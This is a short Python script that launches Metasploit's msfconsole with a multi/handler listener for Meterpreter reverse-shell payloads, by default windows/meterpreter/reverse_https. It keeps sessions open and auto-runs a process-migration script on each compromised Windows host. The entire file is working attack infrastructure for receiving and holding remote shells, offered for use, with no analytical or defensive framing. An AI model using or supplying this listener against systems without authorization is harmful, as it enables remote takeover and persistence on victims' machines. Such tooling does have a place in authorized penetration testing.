#!/usr/bin/env python
#
# Simple python script to start a Meterpreter handler
#
# Original script StartListener.py is the idea of Chris Campbell 
# (obscuresec)
#
# Reworked version author is Oleg Mitrofanov
# Reworked version notes:
# This reworked version uses -x option of msfconsole by default, but can also
# use the -r option supplying a temporary resource file. Be aware that 
# currently (2015 Apr 1) there is a race condition bug associated with -r and
#  -x flags that sometimes leads to errors --
# https://github.com/rapid7/metasploit-framework/issues/4340
# If you get the following or other error --
# [-] Exploit failed: undefined method `const_defined?' for nil:NilClass
# -- then try finishing the procedure by running the exploit with run -j

import argparse 
import os
import subprocess
import sys
import tempfile

def print_info(lhost, lport, payload):
    RESET = "\033[0m"
    BLUE = "\033[1;34m"
    BOLD = "\033[1m"

    print(BOLD + BLUE + "[*]" + RESET + " Starting listener on " +
        "{}:{} for {} payload...".format(lhost, lport, payload))


parser = argparse.ArgumentParser(
    description="Start listener for Metasploit payloads."
)
parser.add_argument("lhost", help="Local IP address")
parser.add_argument("lport", help="Local port number. Defaults to 443", 
    default="443", nargs='?')
parser.add_argument("payload", 
    help="Metasploit payload to expect. "
         "Defaults to windows/meterpreter/reverse_https",
    default="windows/meterpreter/reverse_https", nargs='?')
parser.add_argument(
    "-r", 
    help="Pass msfconsole a resource file using -r instead of -x option",
    action="store_true"
)
args = parser.parse_args()


lhost = args.lhost
lport = args.lport
payload = args.payload
res_file = args.r

delimeter = "\n" if res_file else "; "

msfconsole_commands = delimeter.join([
    "use exploit/multi/handler",
    "set PAYLOAD " + payload,
    "set LHOST " + lhost,
    "set LPORT " + lport,
    "set ExitOnSession false",
    "set AutoRunScript post/windows/manage/smart_migrate",
    "exploit -j"
])

print_info(lhost, lport, payload)

if res_file:
    tmp_fhandle, tmp_fname = tempfile.mkstemp(text=True)
    os.write(tmp_fhandle, msfconsole_commands)
    os.close(tmp_fhandle)
    shell_command = '/opt/metasploit/app/msfconsole -q -r "{}"'.format(tmp_fname)
    subprocess.call(shell_command, shell=True)
    os.remove(tmp_fname)
else:
    shell_command = 'msfconsole -q -x "{}"'.format(msfconsole_commands)
    subprocess.call(shell_command, shell=True)
